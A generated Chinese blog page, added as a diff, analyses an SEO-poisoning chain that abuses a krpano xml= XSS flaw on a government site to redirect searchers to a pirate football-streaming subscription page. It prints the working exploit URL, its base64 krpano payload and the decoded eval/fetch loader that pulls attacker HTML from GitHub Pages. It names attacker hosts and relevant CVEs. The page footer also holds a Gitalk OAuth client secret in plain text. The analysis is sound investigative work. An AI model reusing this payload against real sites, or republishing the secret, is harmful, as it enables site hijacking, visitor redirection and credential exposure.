@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="blog" />
+       
+      <meta name="description" content="yqq" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>SEO分析 |  yqq&#39;s blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
+
+      <!-- mermaid -->
+      
+      <script src="https://cdn.jsdelivr.net/npm/mermaid@11.2.1/dist/mermaid.min.js"></script>
+      
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-technology/security/SEO分析"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  SEO分析
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2026/11/09/technology/security/SEO%E5%88%86%E6%9E%90/" class="article-date">
+  <time datetime="2026-11-09T08:15:00.000Z" itemprop="datePublished">2026-11-09</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">12 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>今天在Google搜索 “reddit”，在搜索结果的第2页，看到一个政府网站的链接，标题竟然是“LIVE TWENTE VS AJAX FOOTBALL LIVE FREE REDDIT”，点击之后，跳转到了足球比赛的直播页面。需要充值才能观看。</p>
+<p>下面是对这个流程的完整分析（借助AI）</p>
+<h1 id="SEO分析"><a href="#SEO分析" class="headerlink" title="SEO分析"></a>SEO分析</h1><p>在Google搜索 “reddit”，在搜索结果的第2页，看到一个政府网站的链接。如图：</p>
+<p><img src="https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img/20261109-155105.jpg"></p>
+<p>完整的链接如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://data.cqna.gov.cn/vr/jiedao/ns/tour.html?xml=data:video/mp4;base64,PGtycGFubz48aW5jbHVkZSB1cmw9Ii9cL2p1bnRlc3RhY2Njb3VudC5naXRodWIuaW8vbmV3cy9ic3BuL3Rlc3QvYS54bWwiLz48L2tycGFubz4=&amp;id=video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img/twete_vs_ajax.png"></p>
+<p>在AI的帮助下，对链接进行分析：</p>
+<p><img src="https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img/2026-11-09-16-19-37.png"></p>
+<p>对链接中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PGtycGFubz48aW5jbHVkZSB1cmw9Ii9cL2p1bnRlc3RhY2Njb3VudC5naXRodWIuaW8vbmV3cy9ic3BuL3Rlc3QvYS54bWwiLz48L2tycGFubz4=</span><br></pre></td></tr></table></figure>
+
+<p>base64解码后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;krpano&gt;&lt;include url=&quot;/\/juntestacccount.github.io/news/bspn/test/a.xml&quot;/&gt;&lt;/krpano&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XML的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;krpano version=&quot;1.0.8.15&quot;&gt;</span><br><span class="line">&lt;script src=&quot;chrome-extension://ofaokhiedipichpaobibbnahnkdoiiah/src/frames_handler.js&quot;/&gt;</span><br><span class="line">&lt;layer name=&quot;js_loader&quot; type=&quot;container&quot; visible=&quot;false&quot; onloaded=&quot;js(eval(var w=atob(&#x27;dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjYXphcl9hcnF1aXRlY3RvbmljbyI7CmZldGNoKCJodHRwczovL2p1bnRlc3RhY2Njb3VudC5naXRodWIuaW8vbmV3cy9ic3BuL3Rlc3QvIiArIGlkICsgIi5odG1sIikKICAudGhlbihlID0+IGUudGV4dCgpKQogIC50aGVuKGUgPT4gewogICAgZG9jdW1lbnQub3BlbigpLAogICAgZG9jdW1lbnQud3JpdGUoZSksCiAgICBkb2N1bWVudC5jbG9zZSgpCiAgfSk7&#x27;);eval(w)););&quot;/&gt;</span><br><span class="line">&lt;/krpano&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>对 atob中的内容进行解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var id = new URLSearchParams(location.search).get(&quot;id&quot;) || &quot;alcazar_arquitectonico&quot;;</span><br><span class="line">fetch(&quot;https://juntestacccount.github.io/news/bspn/test/&quot; + id + &quot;.html&quot;)</span><br><span class="line">  .then(e =&gt; e.text())</span><br><span class="line">  .then(e =&gt; &#123;</span><br><span class="line">    document.open(),</span><br><span class="line">    document.write(e),</span><br><span class="line">    document.close()</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+
+<p><code>eval(w)</code> 执行上面的代码，将 id 替换为 <code>id=video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv</code>，</p>
+<p>完整的链接如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://juntestacccount.github.io/news/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html</span><br></pre></td></tr></table></figure>
+
+<p>用户点击Google搜索结果之后会执行代码，跳转到 <a target="_blank" rel="noopener" href="https://juntestacccount.github.io/news/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html">https://juntestacccount.github.io/news/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html</a> ，然后浏览器会加载这个页面。</p>
+<p>页面代码： <a target="_blank" rel="noopener" href="https://github.com/juntestacccount/news/blob/main/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html">https://github.com/juntestacccount/news/blob/main/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html</a></p>
+<p>最后跳转到目标网站：<a target="_blank" rel="noopener" href="https://streamespn.org/soccer/dutch-eredivisie/twente-vs-ajax-2026-11-08-13-30?alpha">https://streamespn.org/soccer/dutch-eredivisie/twente-vs-ajax-2026-11-08-13-30?alpha</a></p>
+<p><a target="_blank" rel="noopener" href="https://trusthubmedia.com/app/signup/soccer">https://trusthubmedia.com/app/signup/soccer</a></p>
+<hr>
+<p>用AI对html代码进行分析，</p>
+<hr>
+<h1 id="AI分析报告"><a href="#AI分析报告" class="headerlink" title="AI分析报告"></a>AI分析报告</h1><blockquote>
+<p>代码： <a target="_blank" rel="noopener" href="https://github.com/juntestacccount/news/blob/main/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html">https://github.com/juntestacccount/news/blob/main/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html</a></p>
+</blockquote>
+<p>我在静态读取你上传的文件，没有执行任何代码。已经查完，下面是结论。</p>
+<p>这个 HTML 本身不含跳转代码，只有<strong>两处</strong>不属于 Sky Sports 原模板的东西。</p>
+<p><strong>1. 第 18 行：外部跳转脚本（核心）</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://akmistao.site/js/alpha-dutch.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这是整个文件里<strong>唯一</strong>一个写死在 HTML 里的外部 <code>&lt;script src&gt;</code>。我按以下关键词搜了全文：<code>eval(</code>、<code>atob(</code>、<code>unescape(</code>、<code>fromCharCode</code>、<code>document.write</code>、<code>location.href/replace/assign</code>、<code>window.location</code>，<strong>没有任何命中</strong>。也没有 <code>&lt;meta http-equiv=&quot;refresh&quot;&gt;</code>。所以页面里能触发跳转的入口，只有这一行。</p>
+<p><strong>2. 第 1603 行：访问统计像素</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;//sstatic1.histats.com/0.gif?5050800&amp;101&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这是 Histats（免费访客统计服务）的计数图，<code>5050800</code> 是统计账号 ID。它在 Sky 原模板里不存在，是攻击者加的，用来统计每个垃圾页吸引了多少访客。这个 ID 对举报有用，Histats 可以据此定位到账号。</p>
+<h2 id="其余内容是什么"><a href="#其余内容是什么" class="headerlink" title="其余内容是什么"></a>其余内容是什么</h2><p>整个文件约 1600 行、124 KB，其余都是复制的 Sky Sports 页面：</p>
+<ul>
+<li>导航、页脚、登录模板、Adobe / Google Analytics / Qualtrics / DotMetrics / Covatic 等脚本，全是 Sky 自己的。</li>
+<li>这些脚本里很多用的是相对路径（如 <code>/js/modules-es6/...</code>、<code>/css/...</code>），放在 github.io 上会 404，页面样式和功能其实是坏的。攻击者不在乎，因为这个页面主要给搜索引擎爬虫看的，真人访客一般在样式加载前就被脚本带走了。</li>
+<li>标题、正文、”Watch Next” 里的 11 条标题全被替换成 “LIVE Twente vs Ajax Football Live fRee Reddit”，图片统一指向同一张 shutterstock 缩略图。这是典型的关键词堆砌。</li>
+<li>结构化数据里的发布日期是 2026-11-11（比今天还晚两天），<code>mainEntityOfPage</code> 指向一篇无关的 Man Utd 文章，都是造假和模板残留。</li>
+</ul>
+<h2 id="完整链路"><a href="#完整链路" class="headerlink" title="完整链路"></a>完整链路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Google 搜索结果</span><br><span class="line">  → data.cqna.gov.cn（krpano 的 xml= 参数被滥用）</span><br><span class="line">  → 加载 juntestacccount.github.io 的 a.xml（里面的 JS 再去拉 &lt;id&gt;.html）</span><br><span class="line">  → 这个仿冒 Sky Sports 页面</span><br><span class="line">  → 第 18 行加载 akmistao.site/js/alpha-dutch.js</span><br><span class="line">  → 跳转到 streamespn.org/soccer/dutch-eredivisie/...?alpha</span><br></pre></td></tr></table></figure>
+
+<h2 id="还没验证的部分"><a href="#还没验证的部分" class="headerlink" title="还没验证的部分"></a>还没验证的部分</h2><p><code>alpha-dutch.js</code> 的内容我这边读不到，所以<strong>它具体怎么拼出最终地址、有没有条件判断（比如只对来自 Google 的访客跳转）</strong>，目前只是推断。你可以用之前给的 curl 命令下载后贴给我。</p>
+<hr>
+<h1 id="在页面点击视频后，会跳转到目标网站"><a href="#在页面点击视频后，会跳转到目标网站" class="headerlink" title="在页面点击视频后，会跳转到目标网站"></a>在页面点击视频后，会跳转到目标网站</h1><p>链接是：<a target="_blank" rel="noopener" href="https://trusthubmedia.com/app/aff/go/1xl-DJTBpEEB2J?i=1">https://trusthubmedia.com/app/aff/go/1xl-DJTBpEEB2J?i=1</a></p>
+<p>目标网站是： <a target="_blank" rel="noopener" href="https://trusthubmedia.com/app/signup/soccer">https://trusthubmedia.com/app/signup/soccer</a></p>
+<p><img src="https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img/2026-11-09-17-18-09.png"></p>
+<h2 id="用AI继续分析"><a href="#用AI继续分析" class="headerlink" title="用AI继续分析"></a>用AI继续分析</h2><p>这张截图很关键，它说明那份 AI 报告对这个网站的定性有偏差。</p>
+<h2 id="报告错在哪里"><a href="#报告错在哪里" class="headerlink" title="报告错在哪里"></a>报告错在哪里</h2><p>报告把 TrustHubMedia 说成”开放资源聚合的信息中介”，依据主要是 About Us 页面和用户协议。但注册页上写得很清楚，它卖的是<strong>盗版足球赛事直播会员</strong>：</p>
+<ul>
+<li>页面标题：Soccer Events Live Stream Online</li>
+<li>产品名：Soccer Game Pass，卖点是 “Full Access of Soccer and All Sports Event Online”</li>
+<li>收款方式：只有信用卡</li>
+</ul>
+<p>“帮用户搜索互联网上的 Open Source Data”更像一层法律包装，让网站在声明上显得不是直接提供内容。这是我的推断，但它与产品页的实际用途明显不符。</p>
+<h2 id="报告里的具体数据和截图对不上"><a href="#报告里的具体数据和截图对不上" class="headerlink" title="报告里的具体数据和截图对不上"></a>报告里的具体数据和截图对不上</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>报告里写的</th>
+<th>实际注册页</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>套餐</td>
+<td>15 天 / 30 天 / 365 天</td>
+<td>7 天 $4.99、月付 $19.99、周付 $9.99</td>
+</tr>
+<tr>
+<td>年度会员</td>
+<td>有</td>
+<td>没有</td>
+</tr>
+<tr>
+<td>报告里的示例价格</td>
+<td>$5 / $10 / $60</td>
+<td>纯属虚构，与真实价格无关</td>
+</tr>
+</tbody></table>
+<p>截图里的定价本身也有矛盾：</p>
+<ul>
+<li>“7 Days $4.99” 和 “Weekly $9.99” 时长相同，价格差一倍。</li>
+<li>周付套餐的说明写着 “Full Season Access”，周卡不可能有整个赛季的权限。</li>
+</ul>
+<p>这种页面看起来像是用模板拼出来的，用 $4.99 的低价钩子吸引人下单。报告说协议里有 Trial 和 Rebill（续费）条款，如果属实，$4.99 的首单很可能自动续成更贵的套餐。这一点需要对照条款原文确认。</p>
+<h2 id="它和你前面查的链路怎么连上"><a href="#它和你前面查的链路怎么连上" class="headerlink" title="它和你前面查的链路怎么连上"></a>它和你前面查的链路怎么连上</h2><p>完整链路现在是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Google 搜索垃圾结果</span><br><span class="line">  → 被黑的政府站 krpano 漏洞</span><br><span class="line">  → GitHub 仿冒 Sky Sports 页面</span><br><span class="line">  → akmistao.site 跳转脚本</span><br><span class="line">  → streamespn.org/...?alpha</span><br><span class="line">  → TrustHubMedia 注册页（刷卡订阅）</span><br></pre></td></tr></table></figure>
+
+<p>前面那一大串劫持、SEO 投毒、重定向，都是<strong>为这个收款页面免费获客</strong>。报告里引用的流量数据（引荐占约 64%、搜索仅约 0.08%）与这个解释吻合：落地站的访客大多是被别的站点转来的。不过那是第三方历史估算，只能当旁证。</p>
+<p>另外，报告提到网站有 Affiliate 联盟系统。<code>?alpha</code> 这个参数有可能就是联盟或渠道标记。这只是推测，目前没有证据证明 TrustHubMedia 的运营方本人指使了政府站劫持，也可能是某个推广者自己在刷流量。要验证的话，可以观察跳到 TrustHub 时 URL 里带的参数（比如 <code>aff</code>、<code>ref</code>、<code>utm</code>），这些参数会指向具体的推广者账号。</p>
+<h2 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h2><p>这是一条<strong>用黑帽 SEO 免费获客、最终卖盗版足球直播会员</strong>的灰色产业链。前面的劫持、跳转都是引流手段，真正赚钱的是末端的刷卡订阅页。</p>
+<h2 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">① 用户在 Google 搜 &quot;reddit&quot; 等热词</span><br><span class="line">② 结果里出现 &quot;LIVE Twente vs Ajax ... Free Reddit&quot;（挂在 .gov.cn 等高权重域名下）</span><br><span class="line">③ 点击后进入被滥用的政府站 krpano 页面（xml= 参数加载外部配置）</span><br><span class="line">④ 加载 GitHub Pages 上的 a.xml，再按 id 拉取对应的仿冒页面</span><br><span class="line">⑤ 仿冒 Sky Sports 页面（只给搜索引擎看，用来做关键词排名）</span><br><span class="line">⑥ 页面里的 akmistao.site/js/alpha-dutch.js 把访客带走</span><br><span class="line">⑦ streamespn.org 盗版直播站（带 ?alpha 渠道标记）</span><br><span class="line">⑧ TrustHubMedia 注册页：$4.99 / $9.99 / $19.99 的 Soccer Game Pass，信用卡支付</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="各环节的作用"><a href="#各环节的作用" class="headerlink" title="各环节的作用"></a>各环节的作用</h2><table>
+<thead>
+<tr>
+<th>环节</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>被黑的政府/高校站点</td>
+<td>借高权重域名让垃圾页排上 Google 前列</td>
+</tr>
+<tr>
+<td>GitHub Pages</td>
+<td>免费托管成千上万个关键词页面，每个 id 对应一个热门赛事</td>
+</tr>
+<tr>
+<td>仿冒 Sky Sports 页面</td>
+<td>给爬虫看的内容壳，堆关键词</td>
+</tr>
+<tr>
+<td>akmistao.site 脚本</td>
+<td>集中控制跳转目标，换终点只需改一个文件</td>
+</tr>
+<tr>
+<td>streamespn.org</td>
+<td>中转落地站，同时承接直播类关键词流量</td>
+</tr>
+<tr>
+<td>TrustHubMedia</td>
+<td>收款端，靠会员订阅变现</td>
+</tr>
+</tbody></table>
+<h2 id="商业模式本质"><a href="#商业模式本质" class="headerlink" title="商业模式本质"></a>商业模式本质</h2><ul>
+<li><strong>获客成本接近零</strong>：流量来自被劫持的第三方域名和免费托管，不用买广告。</li>
+<li><strong>变现靠低价订阅</strong>：$4.99 首单做钩子，条款里有试用和续费（Rebill）机制，真实的续费规则需要看条款原文才能确认。</li>
+<li><strong>用”资源聚合”做法律包装</strong>：网站声明自己只是帮用户搜索公开资源，规避直接提供盗版内容的责任。</li>
+<li><strong>可能有联盟分成</strong>：注册页和 <code>?alpha</code> 参数显示存在渠道标记，不排除是推广者在刷流量，这一点只是推测，没有证据证明运营方指使了劫持。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">① 批量生成&quot;赛事 + live + free + reddit&quot;页面</span><br><span class="line">   每场比赛一个 id，如 video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv</span><br><span class="line"></span><br><span class="line">② 借高权重域名挂页面</span><br><span class="line">   利用政府站 data.cqna.gov.cn 的 krpano 页面漏洞（xml= 参数可加载外部配置），</span><br><span class="line">   让 .gov.cn 域名&quot;长出&quot;这些垃圾页，借它的权重冲 Google 排名</span><br><span class="line"></span><br><span class="line">③ 外部页面托管在 GitHub Pages</span><br><span class="line">   a.xml 里的 JS 按 id 去 juntestacccount.github.io 拉取对应 html，</span><br><span class="line">   页面是仿冒的 Sky Sports 模板，标题和关键词全改成赛事词，专门给爬虫看</span><br><span class="line"></span><br><span class="line">④ 真人点击后被带走</span><br><span class="line">   页面里 akmistao.site/js/alpha-dutch.js 负责跳转（脚本名里的 dutch 对应荷甲）</span><br><span class="line"></span><br><span class="line">⑤ 中转站 streamespn.org</span><br><span class="line">   URL 形如 /soccer/dutch-eredivisie/twente-vs-ajax-2026-11-08-13-30?alpha</span><br><span class="line"></span><br><span class="line">⑥ 收款页 TrustHubMedia</span><br><span class="line">   Soccer Game Pass 会员，$4.99 / $9.99 / $19.99，信用卡（据你说是 Stripe）支付</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="krpano-漏洞说明"><a href="#krpano-漏洞说明" class="headerlink" title="krpano 漏洞说明"></a>krpano 漏洞说明</h1><p>我先查一下这个漏洞的官方信息，避免凭记忆说错。</p>
+<h2 id="漏洞是什么"><a href="#漏洞是什么" class="headerlink" title="漏洞是什么"></a>漏洞是什么</h2><p><strong>krpano</strong> 是一款做全景图和 VR 漫游的播放器，很多政府、高校、企业网站的”全景导览”页面都在用。你遇到的问题是它的一个<strong>反射型 XSS（跨站脚本）漏洞</strong>，核心在 URL 里的 <code>xml=</code> 参数。</p>
+<p>原理很简单：</p>
+<ul>
+<li><code>https://data.cqna.gov.cn/vr/jiedao/ns/tour.html</code> 这个页面是政府站 data.cqna.gov.cn 的一个全景导览页面，用 krpano 播放。</li>
+<li>krpano 页面的配置是 XML 文件，正常情况下由网站自己指定。</li>
+<li>如果网站设置允许通过 URL 的 <code>xml=</code> 参数传入配置，攻击者就可以构造链接，让页面加载<strong>他指定的内容</strong>。</li>
+<li>你最初那条链接里 <code>xml=data:video/mp4;base64,...</code> 就是这么做的：用 <code>data:</code> URL 把一段 Base64 编码的 XML 直接塞进参数里，再让它去 include 攻击者 GitHub 上的文件。</li>
+<li>krpano 的 XML 能调用 JavaScript，所以最终等于<strong>在政府网站的域名下执行攻击者的脚本</strong>。</li>
+</ul>
+<h2 id="公开记录"><a href="#公开记录" class="headerlink" title="公开记录"></a>公开记录</h2><ul>
+<li>2020 年就有相关漏洞披露：krpano 1.20.8 及以前版本的默认安装存在反射型 XSS，原因是 /viewer/krpano.html 对 xml 参数的外部 XML 加载不安全（CVE-2020-24900）。</li>
+<li>官方当时的修补并不彻底。SecurityWeek 报道称，这个缺陷自 2020 年就为人所知（CVE-2020-24901），开发者当时加了一些限制，但补丁不完整，影响也被低估。</li>
+<li>2025 年又有新编号：1.23.1 及以前版本在 passQueryParameters 函数中，因 xml 参数处理不当导致 XSS（CVE-2025-65892），升级到 1.23.2 可以消除。</li>
+<li>krpano 作者的说法是：自 2021 年 9 月的 1.20.10 起，所有版本默认都把 passQueryParameters 设为关闭或无害值，正常情况下不该再受 XSS 影响，只有显式允许 xml 通过查询参数传入时才有风险，而这种配置很罕见。</li>
+</ul>
+<h2 id="和你这个案例的关系"><a href="#和你这个案例的关系" class="headerlink" title="和你这个案例的关系"></a>和你这个案例的关系</h2><p>SecurityWeek 报道的就是同一类手法：攻击者利用这个 XSS，把访客从大机构网站的页面重定向到任意域名，并用 SEO 投毒引流，目的地包括成人内容、赌场、黑客服务等可疑站点。你看到的”政府站 → 跳转 → 盗版直播”是同一套打法，只是换成了体育赛事关键词。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2026/11/09/technology/security/SEO%E5%88%86%E6%9E%90/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%A0%94%E7%A9%B6/" rel="tag">研究</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2026/06/08/technology/other/NestJS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">NestJS学习笔记</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: 'Ov23li39D7xcwiTHeGgk',
+    clientSecret: '007da9b580d1c5627f38c2e4d6130837031c9261',
+    repo: 'youngqqcn.github.io',
+    owner: 'youngqqcn',
+    admin: ['youngqqcn'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2026
+        <i class="ri-heart-fill heart_icon"></i> youngqqcn
+      </li>
+    </ul>
+    <ul>
+        <!-- 感谢shenyu的ayer主题, by youngqqcn 2021-04-26-->
+      <!-- <li>
+        
+        
+        
+        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
+        <span class="division">|</span>
+        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li> -->
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.jpeg" alt="yqq&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E7%94%9F%E6%B4%BB">生活</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E6%8A%80%E6%9C%AF">技术</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E8%AF%BB%E4%B9%A6">读书</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E5%AD%A6%E4%B9%A0">学习</a>
